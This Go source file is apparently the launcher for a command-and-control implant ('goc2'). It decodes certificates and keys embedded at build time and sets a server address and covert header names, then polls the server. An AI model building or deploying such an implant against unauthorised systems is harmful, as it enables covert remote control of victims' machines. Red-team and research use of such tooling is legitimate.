package main

import (
	"encoding/base64"
	"log"
	"strconv"
	"strings"

	"github.com/molu/goc2/pkg/agent"
)

var (
	AgentName    string
	ServerAddr   string
	CACertB64    string
	CertB64      string
	PrivKeyB64   string
	KeyPass      string
	IDHeader     string
	CmdHeader    string
	DataHeader   string
	RequestDelay string // cannot assign other types using -X
)

func main() {
	caCert, err := base64.StdEncoding.DecodeString(CACertB64)
	if err != nil {
		log.Fatalf("failed to decode base64: %v", err)
	}
	caCertBlock := strings.ReplaceAll(string(caCert), "\\n", "\n")

	cert, err := base64.StdEncoding.DecodeString(CertB64)
	if err != nil {
		log.Fatalf("failed to decode base64: %v", err)
	}
	certBlock := strings.ReplaceAll(string(cert), "\\n", "\n")

	privKey, err := base64.StdEncoding.DecodeString(PrivKeyB64)
	if err != nil {
		log.Fatalf("failed to decode base64: %v", err)
	}
	privKeyBlock := strings.ReplaceAll(string(privKey), "\\n", "\n")

	requestDelay, err := strconv.Atoi(RequestDelay)
	if err != nil {
		log.Fatalf("failed to parse string to int: %v", err)
	}

	a := &agent.Agent{
		Name:         AgentName,
		ServerAddr:   ServerAddr,
		CACert:       []byte(caCertBlock),
		Cert:         []byte(certBlock),
		PrivKey:      []byte(privKeyBlock),
		KeyPass:      []byte(KeyPass),
		IDHeader:     IDHeader,
		CmdHeader:    CmdHeader,
		DataHeader:   DataHeader,
		RequestDelay: requestDelay,
	}
	a.Poll()
}
